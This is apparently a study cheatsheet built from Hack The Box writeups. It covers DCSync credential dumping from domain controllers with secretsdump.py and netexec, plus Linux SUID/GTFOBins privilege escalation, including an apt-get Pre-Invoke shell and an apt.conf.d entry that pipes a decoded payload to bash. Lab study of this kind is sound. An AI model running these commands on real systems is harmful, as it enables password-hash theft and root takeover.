## Q12 — DCSync attack

**Question:** Which HTB machines demonstrate the DCSync attack and how does it work?

**Answer:**

Based on the provided writeups, the DCSync attack is used to replicate directory data from a Domain Controller (specifically dumping user and administrator password hashes such as the NTDS) over the network without executing code on the DC directly. It requires communication with the DC (e.g., over TCP 445, 135, and high RPC ports) and sufficient privileges or machine account tickets to request replication data.

---

### Privilege Escalation

* **DCSync via Impacket's `secretsdump.py`**:
  * Run remotely against the Domain Controller using credentials of an account granted replication rights:
    ```bash
    secretsdump.py '[username]:[password]@[ip]'
    ```
    *(seen on: Sauna)*

* **DCSync via Kerberos / `netexec`**:
  * Target a specific user's hash (e.g., administrator) from the NTDS using a Kerberos cache (`.ccache`) file obtained after delegations (like RBCD):
    ```bash
    KRB5CCNAME=<ticket>.ccache netexec smb <target_fqdn> -k --use-kcache --ntds --user administrator
    ```
    *(seen on: Vintage)*
  * Set up Kerberos configuration with `netexec` using machine account credentials, configure `/etc/krb5.conf`, and execute DCSync with the machine account TGT:
    ```bash
    netexec smb <target_fqdn> -u '<machine_account>$' -p <password> --generate-krb5-file krb5.conf
    ```
    *(seen on: Delegate)*

* **DCSync Following Privilege Escalation / Roasting**:
  * Gained replication capabilities through user group permissions and accesses to dump administrator hashes: *(seen on: Forest)*
  * Performed Kerberoasting to obtain a user account that holds DCSync rights, dumping hashes to acquire domain admin shell: *(seen on: Sizzle)*

## SUID / GTFOBins Exploitation Cheatsheet

### Recon & Enumeration

* **Automated SUID Discovery:**
  * Run automated enumeration tools such as `LinPEAS` to automatically flag unusual SUID binaries (seen on: Mango, Toby, Forwardslash).
* **Manual SUID Enumeration:**
  * Search for SUID binaries via `find`:
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    (seen on: Mango)
  * Locate files owned by a specific target user when analyzing custom SUID programs:
    ```bash
    find / -user <username> -type f 2>/dev/null
    ```
    (seen on: Forwardslash)
* **Inspect File Permissions:**
  * Verify the SUID bit (`-r-s...`) and owner permissions:
    ```bash
    ls -l /path/to/binary
    ```
    (seen on: Forwardslash)

---

### Privilege Escalation

* **Abusing Package Managers (APT Pre-Invoke) via GTFOBins:**
  * Exploit `apt-get` directly if allowed via `sudo` or similar execution vectors:
    ```bash
    sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
    ```
    (seen on: Writer)
  * Inject `apt` configuration entries into `/etc/apt/apt.conf.d/` to trigger arbitrary code execution on update:
    ```bash
    echo 'apt::Update::Pre-Invoke {"echo <base64_payload> | base64 -d | bash"};' > /etc/apt/apt.conf.d/000-shell
    ```
    (seen on: Writer)

* **Shadow SUID Abuse (`binfmt_misc`):**
  * Abuse the `C` credentials flag in `binfmt_misc` handlers so that execution of a SetUID binary passes elevated/root privileges directly to the custom interpreter handler (seen on: Retired).

* **SUID Restrictions & Limitations:**
  * Web servers or environments using modules like `mpm-itk` may deploy seccomp filters or directives (`LimitUIDRange`, `LimitGIDRange`) preventing `setresuid()` or `setuid()` system calls, causing SUID binaries to fail when invoked through web context shells (seen on: Pandora).
